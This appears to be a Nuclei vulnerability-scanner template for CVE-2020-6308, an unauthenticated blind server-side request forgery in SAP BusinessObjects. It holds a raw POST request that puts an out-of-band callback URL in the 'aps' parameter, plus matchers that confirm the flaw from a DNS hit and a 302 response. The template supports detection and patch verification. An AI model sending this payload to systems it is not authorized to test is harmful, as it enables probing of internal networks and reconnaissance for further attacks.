id: CVE-2020-6308

info:
  name: Unauthenticated Blind SSRF in SAP
  author: madrobot
  severity: medium
  description: |
   SAP BusinessObjects Business Intelligence Platform (Web Services) versions - 410, 420, 430, allows an unauthenticated attacker to inject arbitrary values as CMS parameters to perform lookups on the internal network which is otherwise not accessible externally. On successful exploitation, attacker can scan internal network to determine internal infrastructure and gather information for further attacks like remote file inclusion, retrieve server files, bypass firewall and force the vulnerable server to perform malicious requests, resulting in a Server-Side Request Forgery vulnerability.
  reference:
    - https://github.com/InitRoot/CVE-2020-6308-PoC
    - https://launchpad.support.sap.com/#/notes/2943844
    - https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=558632196
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2020-6308
    cwe-id: CWE-918
  tags: cve,cve2020,sap,ssrf,oast,blind

requests:
  - raw:
      - |-
        POST /AdminTools/querybuilder/logon?framework= HTTP/1.1
        Host: {{Hostname}}
        Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
        Accept-Language: en
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9
        Content-Length: 164
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
        Pragma: no-cache
        Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*

        aps={{interactsh-url}}&usr=anything&pwd=anything&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: status
        status:
          - 302
        condition: and
